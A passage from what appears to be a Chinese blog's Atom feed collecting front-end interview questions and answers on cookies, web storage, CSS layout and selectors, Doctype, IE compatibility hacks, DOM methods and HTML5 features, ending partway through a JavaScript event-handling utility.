吗？</p></blockquote><p>如何开发一个<a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" target="_blank" rel="external"> webpack loader</a></p><h1 id="发散题"><a href="#发散题" class="headerlink" title="发散题"></a>发散题</h1><blockquote><p>从输入 URL 到页面展现中间发生了什么？</p></blockquote><p>1）DNS 查询 DNS 缓存<br>2）建立 TCP 连接（三次握手）连接复用<br>3）发送 HTTP 请求（请求的四部分）<br>4）后台处理请求<br>  监听 80 端口<br>  路由<br>  渲染 HTML 模板<br>  生成响应<br>5）发送 HTTP 响应<br>6）关闭 TCP 连接（四次挥手）<br>7）解析 HTML<br>8）下载 CSS（缓存<br>9）解析 CSS<br>10）下载 JS（缓存<br>11）解析 JS<br>12）下载图片<br>13）解析图片<br>14）渲染 DOM 树<br>15）渲染样式树<br>16）执行 JS</p><blockquote><p>你没有工作经历吗？</p></blockquote><p>一开始就问，可以拜拜。<br>中间问最后问，他想压价。<br>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。</p><h1 id="刁钻代码"><a href="#刁钻代码" class="headerlink" title="刁钻代码"></a>刁钻代码</h1><p><a href="http://wangsiyuan233.cn/2018/06/20/55JavaScript-Puzzlers/" target="_blank" rel="external">JavaScript Puzzlers!</a></p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>1）排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）<br>2）二分查找法<br>3）翻转二叉树</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;JavaScript&quot;&gt;&lt;a href=&quot;#JavaScript&quot; class=&quot;headerlink&quot; title=&quot;JavaScript&quot;&gt;&lt;/a&gt;JavaScript&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JS 有哪些数据类型？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;string number bool undefined null object symbol&lt;br&gt;object 包括了数组、函数、正则、日期等对象&lt;br&gt;一旦出现（数组、函数、正则、日期、NaN）直接0分&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前端总结1</title>
    <link href="wangsiyuan233.github.io/2018/07/14/60%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%931/"/>
    <id>wangsiyuan233.github.io/2018/07/14/60面试题目总结1/</id>
    <published>2018-07-14T09:16:52.000Z</published>
    <updated>2018-07-17T23:13:51.784Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>请你谈谈Cookie的弊端</p></blockquote><p><strong>优点</strong>： 极高的扩展性和可用性<br>1) 数据持久性。<br>2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。<br>3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。<br>4) 简单性。 基于文本的轻量结构。<br>5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。<br>6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。<br>7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。<br><a id="more"></a><br><strong>缺点</strong>：<br>1) Cookie 数量和长度的限制 。<br>数量：每个域的 cookie 总数有限。<br>a) IE6 或更低版本最多 20 个 cookie<br>b) IE7 和之后的版本最后可以有 50 个 cookie<br>c) Firefox 最多 50 个 cookie<br>d) chrome 和 Safari 没有做硬性限制<br>长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。<br>2) 潜在的安全风险 。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能取得所有的 session 信息。<br>3) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。<br>4) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p><blockquote><p>简单说一下浏览器本地存储是怎样的</p></blockquote><p>1)Cookie ： 广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。<br>2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。<br>优点：容量适中，基本上不存在兼容性问题<br>缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。<br>3)Google Gears ： Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。<br>4)User Data ： 是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。<br>（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）<br>（实际测试 2000 （ IE5.5 ）、 XP （ IE6 、 IE7 ）， Vista （ IE7 ）下都是可正常使用。）<br>5)Web Storage<br>在较高版本的浏览器中，JS 提供了 sessionStorage 和 globalStorage 。<br>在 HTML5 中提供了 sessionStorage 和 localStorage 。<br>sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。<br>globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。<br>localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上。<br>优点：容量大、易用、强大、原生支持<br>缺点： a) 兼容性差（ Chrome,  Safari, Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）<br>b) 安全性差（所以请勿使用 localStorage 保存敏感信息）</p><blockquote><p>web storage和cookie的区别</p></blockquote><p>1)存储空间不同 。<br>a)Web Storage 能提供 5MB 的存储空间（不同 浏览器 的提供的空间不同）<br>Cookie 仅 4KB 。<br>b)Web Storage 每个域（包括子域）有独立的存储空间，各个存储空间是完全独立的，因此不会造成数据混乱。<br>2)与服务器交互 。<br>Web Storage 中的数据则仅仅是存在本地，不会与服务器发生任何交互。<br>Cookie 的内容会随着请求一并发送的服务器（带宽浪费）。<br>3)接口 。<br>Web Storage 提供更多丰富易用的接口，拥有 setItem ， getItem ， removeItem ， clear 等方法，操作数据更方便。<br>Cookie 需要前端开发者自己封装 setCookie ， getCookie 。<br>4)跨域问题 。<br>cookie 需要指定作用域，不可以跨域调用。<br>说明： Cookie 也是不可以或缺的： Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在 ，而 Web Storage 仅仅是为了在本地“存储”数据而生。</p><blockquote><p>display:none和visibility:hidden的区别？</p></blockquote><p>1) <code>display：none</code>会让元素从渲染树中消失，渲染的时候不占据任何空间；<code>visibility：hidden</code>不会让元素从渲染树中消失，渲染的时候仍然占据空间，只是内容不可见。<br>2) <code>display：none</code>是非继承属性，子孙节点消失是由于元素从渲染树中消失造成，通过修改子孙节点的属性无法显示；<code>visibility：hidden</code>是继承属性，子孙节点消失是由于继承了hidden，通过设置visibility：visible，可以让子孙节点显示。<br>3) 读屏器不会读取<code>display：none</code>的元素内容，而会读取<code>visibility：hidden</code>的元素内容。</p><blockquote><p>CSS中 link 和@import 的区别是？</p></blockquote><p>1) 导入的语法不相同<br>link （链接式）语法为：<br> <code>&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;/&gt;</code><br>@import （导入式）语法为：<br> <code>&lt;style type=&quot;text/css&quot;&gt; @import url(&quot;style.css&quot;); &lt;/style&gt;</code><br>2)  link 和 import 语法结构不同，前者 <code>&lt;link&gt;</code> 是 html 标签，只能放入 html 源代码中使用， link 标签除了可以加载 CSS 外，还可以做很多其它的事情，比如定义 RSS ，定义 rel 连接属性等， @import 看作为 css 的样式，就只能加载 CSS 了；<br>3) 使用 link 方式，浏览器将 CSS 文件和 HTML 的主体部分一同装载，所以显示出来的页面从开始就是带样式效果的；而采用 @import 方式，浏览器则会先装载完整个 HTML 文件后再装载 CSS 文件；<br>4) 当使用 Javascript 控制 DOM 去改变样式的时候，只能使用 link 方式，因为 @import 眼里只有 CSS ，不是 DOM 可以控制的；<br>5) link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持</p><blockquote><p>position的absolute与fixed共同点与不同点</p></blockquote><p>共同点：<br>1) 改变行内元素的呈现方式，display被置为inline-block；<br>2) 让元素脱离普通流，不占据空间；<br>3) 默认会覆盖到非定位元素上</p><p>不同点：<br>absolute的”根元素“是可以设置的，而fixed的”根元素“固定为浏览器窗口。<br>当你滚动网页，fixed元素与浏览器窗口之间的距离是不变的。</p><blockquote><p>介绍一下CSS的盒子模型？</p></blockquote><p>1）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)<br>2）有两种， IE 盒子模型、标准 W3C 盒子模型；IE的content部分包含了 border 和 padding;<br><img src="https://i.imgur.com/v7kdhsX.jpg" alt=""></p><blockquote><p>CSS 选择符有哪些？哪些属性可以继承？优先级算法如何计算？ CSS3新增伪类有那些？</p></blockquote><p><strong>CSS 选择符：</strong><br>1.id选择器(# myid)<br>2.类选择器(.myclassname)<br>3.标签选择器(div, h1, p)<br>4.相邻选择器(h1 + p)<br>5.子选择器(ul &gt; li)<br>6.后代选择器(li a)<br>7.通配符选择器( * )<br>8.属性选择器(a[rel = “external”])<br>9.伪类选择器(a: hover, li:nth-child)</p><p><strong>可继承的样式：</strong><br>1.font-size<br>2.font-family<br>3.color<br>4.text-indent</p><p><strong>不可继承的样式：</strong><br>1.border<br>2.padding<br>3.margin<br>4.width<br>5.height</p><p><strong>优先级算法：</strong><br>1.优先级就近原则，同权重情况下样式定义最近者为准;<br>2.载入样式以最后载入的定位为准;<br>3.!important &gt;  id &gt; class &gt; tag<br>4.important 比 内联优先级高，但内联比 id 要高</p><p><strong>CSS3新增伪类举例：</strong><br>p:first-of-type 选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:last-of-type  选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-of-type  选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-child    选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:nth-child(2)  选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。<br>:enabled :disabled 控制表单控件的禁用状态。<br>:checked        单选框或复选框被选中。</p><blockquote><p>列出display的值，说明他们的作用。position的值， relative和absolute分别是相对于谁进行定位的？</p></blockquote><p>display 的值的作用：<br>1.block 象块类型元素一样显示。<br>2.inline 缺省值。象行内元素类型一样显示。<br>3.inline-block 象行内元素一样显示，但其内容象块类型元素一样显示。<br>4.list-item 象块类型元素一样显示，并添加样式列表标记。</p><p>position 的值的定位区别：<br>1.absolute 生成绝对定位的元素，相对于 static 定位以外的第一个祖先元素进行定位。<br>2.fixed 生成固定定位的元素，相对于浏览器窗口进行定位（老IE不支持）。<br>3.relative 生成相对定位的元素，相对于其在普通流中的位置进行定位。<br>4.static 默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right z-index 声明）。<br>5.inherit 规定从父元素继承 position 属性的值。</p><blockquote><p>CSS3有哪些新特性？</p></blockquote><p>1）CSS3实现圆角（border-radius），阴影（box-shadow），<br>2）对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）<br>3）transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜<br>4）增加了更多的CSS选择器  多背景 rgba<br>5）在CSS3中唯一引入的伪类是 ::selection.<br>6）媒体查询，多栏布局<br>7）border-image</p><blockquote><p>为什么要初始化CSS样式。</p></blockquote><p>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。</p><blockquote><p>对BFC规范的理解？</p></blockquote><p>BFC，块级格式化上下文，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个 BFC 中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的 margin 会发生折叠。<br>W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行布局，以及与其他元素的关系和相互作用。</p><blockquote><p>解释下 CSS sprites，以及你要如何在页面或网站中使用它。</p></blockquote><p>CSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用 CSS 的”<code>background-image</code>“，”<code>background-repeat</code>“，”<code>background-position</code>“ 的组合进行背景定位，<code>background-position</code> 可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了 http2。</p><blockquote><p>说说你对语义化的理解？</p></blockquote><p>1） 去掉或者丢失样式的时候能够让页面呈现出清晰的结构<br>2） 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；<br>3） 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；<br>4） 便于团队开发和维护，语义化使得网页更具可读性，是进一步开发网页的必要步骤，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><blockquote><p>Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</p></blockquote><p>1） <code>&lt;!DOCTYPE&gt;</code>声明位于文档中的最前面，处于 <html> 标签之前。告知浏览器以何种模式来渲染文档。<br>2） 严格模式的排版和 JS 运作模式是  以该浏览器支持的最高标准运行。<br>3） 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。<br>4） DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现。</html></p><blockquote><p>你知道多少种Doctype文档类型？</p></blockquote><p>1） 该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。<br>2） HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。<br>3） XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。<br>4） Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。</p><blockquote><p>HTML与XHTML——二者有什么区别</p></blockquote><p>最主要的不同：<br>XHTML 元素必须被正确地嵌套。<br>XHTML 元素必须被关闭。<br>标签名必须用小写字母。<br>XHTML 文档必须拥有根元素。</p><blockquote><p>html常见兼容性问题？</p></blockquote><p>1） png24位的图片在iE6浏览器上出现背景<br>解决方案：做成PNG8，也可以引用一段脚本处理.</p><p>2） 浏览器默认的margin和padding不同<br>解决方案：加一个全局的 <code>*{margin:0;padding:0;}</code>来统一。</p><p>3） IE6双边距bug：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。<br><code>#box{ float:left; width:10px; margin:0 0 0 10px;}</code><br>这种情况之下IE会产生20px的距离<br>解决方案：在float的标签样式控制中加入<code>_display:inline;</code> 将其转化为行内属性。( _ 这个符号只有ie6会识别)</p><p>4） 渐进识别的方式，从总体中逐渐排除局部。<br>首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。<br>接着，再次使用 “+” 将IE8和IE7、IE6分离开来，这样IE8已经独立识别。<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.bb</span>&#123;</div><div class="line">    <span class="attribute">background-color</span>:<span class="number">#f1ee18</span>; <span class="comment">/*所有识别*/</span></div><div class="line">    <span class="selector-class">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>; <span class="comment">/*IE6、7、8识别*/</span></div><div class="line">    +<span class="attribute">background-color</span>:<span class="number">#a200ff</span>; <span class="comment">/*IE6、7识别*/</span></div><div class="line">    _background-<span class="attribute">color</span>:<span class="number">#1e0bd1</span>; <span class="comment">/*IE6识别*/</span> </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>5）IE下，可以使用获取常规属性的方法来获取自定义属性，也可以使用 getAttribute() 获取自定义属性；Firefox下,只能使用getAttribute()获取自定义属性<br>解决方法：统一通过getAttribute()获取自定义属性</p><p>6）IE下，event对象有 x、y 属性，但是没有 pageX、pageY属性; Firefox下，event对象有 pageX、pageY 属性，但是没有 x、y 属性<br>解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。</p><p>7） Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示<br>解决方法：可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决</p><p>8） 超链接访问过后 hover 样式就不出现了，被点击访问过的超链接样式不在具有 hover 和 active 了<br>解决方法：改变CSS属性的排列顺序 L-V-H-A<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">a</span>:link &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:visited &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:hover &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:active &#123;&#125;</div></pre></td></tr></table></figure></p><p>9）怪异模式问题：漏写 DTD 声明，Firefox 仍然会按照标准模式来解析网页，但在 IE 中会触发怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写 DTD 声明的好习惯。现在可以使用<a href="http://www.w3.org/TR/html5/single-page.html" target="_blank" rel="external">html5</a> 推荐的写法：<code>&lt;!DOCTYPE html&gt;</code></p><p>10） 上下margin重合问题：ie和ff都存在，相邻的两个div的margin-left和margin-right不会重合，但是margin-top和margin-bottom却会发生重合。<br>解决方法：养成良好的代码编写习惯，同时采用margin-top或者同时采用margin-bottom。</p><p>11）ie6对png图片格式支持不好<br>解决方案：引用一段脚本处理</p><blockquote><p>解释下浮动和它的工作原理？清除浮动的技巧</p></blockquote><p>浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。</p><p>1）使用空标签清除浮动。<br>这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</p><p>2）使用overflow。<br>给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</p><p>3）使用after伪对象清除浮动。<br>该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</p><p>可以给父元素设置overflow：auto或者hidden</p><blockquote><p>IE 8以下版本的浏览器中的盒模型有什么不同</p></blockquote><p>IE8以下浏览器的盒模型中定义的元素的宽高包括内边距和边框</p><blockquote><p>DOM操作——怎样添加、移除、移动、复制、创建和查找节点。</p></blockquote><p>1） 创建新节点<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">createDocumentFragment</span><span class="params">()</span></span> <span class="comment">// 创建一个DOM片段</span></div><div class="line"><span class="function"><span class="title">createElement</span><span class="params">()</span></span> <span class="comment">// 创建一个具体的元素</span></div><div class="line"><span class="function"><span class="title">createTextNode</span><span class="params">()</span></span> <span class="comment">// 创建一个文本节点</span></div></pre></td></tr></table></figure></p><p>2） 添加、移除、替换、插入<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">appendChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">removeChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">replaceChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">insertBefore</span><span class="params">()</span></span> <span class="comment">// 在已有的子节点前插入一个新的子节点</span></div></pre></td></tr></table></figure></p><p>3） 查找<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">getElementsByTagName</span><span class="params">()</span></span> <span class="comment">// 通过标签名称</span></div><div class="line"><span class="function"><span class="title">getElementsByName</span><span class="params">()</span></span> <span class="comment">// 通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)</span></div><div class="line"><span class="function"><span class="title">getElementById</span><span class="params">()</span></span> <span class="comment">// 通过元素Id，唯一性</span></div></pre></td></tr></table></figure></p><blockquote><p>html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></blockquote><p>新特性：<br>HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。<br>1） 拖拽释放(Drag and drop) API<br>2） 语义化更好的内容标签（header,nav,footer,aside,article,section）<br>3） 音频、视频API(audio,video)<br>4） 画布(Canvas) API<br>5） 地理(Geolocation) API<br>6） 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；<br>7） sessionStorage 的数据在浏览器关闭后自动删除<br>8） 表单控件，calendar、date、time、email、url、search<br>9） 新的技术webworker, websocket, Geolocation</p><p>移除的元素：<br>1） 纯表现的元素：basefont，big，center，font, s，strike，tt，u；<br>2） 对可用性产生负面影响的元素：frame，frameset，noframes；</p><p>支持HTML5新标签：<br>1） IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shiv框架）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lt IE 9]&gt; </span></div><div class="line">&lt;script&gt; src="http://html5shiv.googlecode.com/svn/trunk/html5.js"&lt;/script&gt; </div><div class="line">&lt;![endif]--&gt;</div></pre></td></tr></table></figure></p><p>如何区分：<br>DOCTYPE声明新增的结构元素、功能元素</p><blockquote><p>iframe的优缺点？</p></blockquote><p>优点：<br>1） 解决加载缓慢的第三方内容如图标和广告等的加载问题<br>2） Security sandbox<br>3） 并行加载脚本</p><p>缺点：<br>1） iframe会阻塞主页面的Onload事件<br>2） 即时内容为空，加载也需要时间<br>3） 没有语意</p><blockquote><p>如何实现浏览器内多个标签页之间的通信?</p></blockquote><p>调用 localstorge、cookies 等本地存储方式</p><blockquote><p>webSocket 如何兼容低浏览器？</p></blockquote><p>Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR</p><blockquote><p>线程与进程的区别</p></blockquote><p>1） 一个程序至少有一个进程,一个进程至少有一个线程<br>2） 线程的划分尺度小于进程，使得多线程程序的并发性高<br>3） 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率<br>4） 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制<br>5） 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别</p><blockquote><p>你如何对网站的文件和资源进行优化？</p></blockquote><p>期待的解决方案包括：<br>1） 文件合并<br>2） 文件最小化/文件压缩<br>3） 使用 CDN 托管<br>4） 缓存的使用（多个域名来提供缓存）<br>5） 其他</p><blockquote><p>请说出三种减少页面加载时间的方法</p></blockquote><p>1） 优化图片<br>2） 图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方）<br>3） 优化CSS（压缩合并css，如 margin-top, margin-left…)<br>4） 网址后加斜杠（如www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）<br>5） 标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。<br>当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了）<br>6） 减少http请求（合并文件，合并图片）</p><blockquote><p>你都使用哪些工具来测试代码的性能？</p></blockquote><p>1） Profiler<br>2） <a href="http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout" target="_blank" rel="external">JSPerf</a><br>3） Dromaeo</p><blockquote><p>什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？</p></blockquote><p>FOUC - Flash Of Unstyled Content 文档样式闪烁<br> <code>&lt;style type=&quot;text/css&quot; media=&quot;all&quot;&gt;@import &quot;../fouc.css&quot;;&lt;/style&gt;</code><br>而引用CSS文件的@import就是造成这个问题的罪魁祸首。IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。<br>解决方法简单的出奇，只要在<code>&lt;head&gt;</code>之间加入一个<code>&lt;link&gt;</code>或者<code>&lt;script&gt;</code>元素就可以了。</p><blockquote><p>null和undefined的区别？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// event(事件)工具集，来源：github.com/markyun</span></div><div class="line">markyun.Event = &#123;</div><div class="line"><span class="comment">// 页面加载完成后</span></div><div class="line">readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">fn=<span class="built_in">document</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line"><span class="built_in">window</span>.onload = fn;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">oldonload();</div><div class="line">fn();</div><div class="line">&#125;;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line"><span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line"><span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">handler.call(element);</div><div class="line">&#125;);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = handler;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 移除事件</span></div><div class="line">removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.removeEventListener) &#123;</div><div class="line">element.removeEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</div><div class="line">element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div 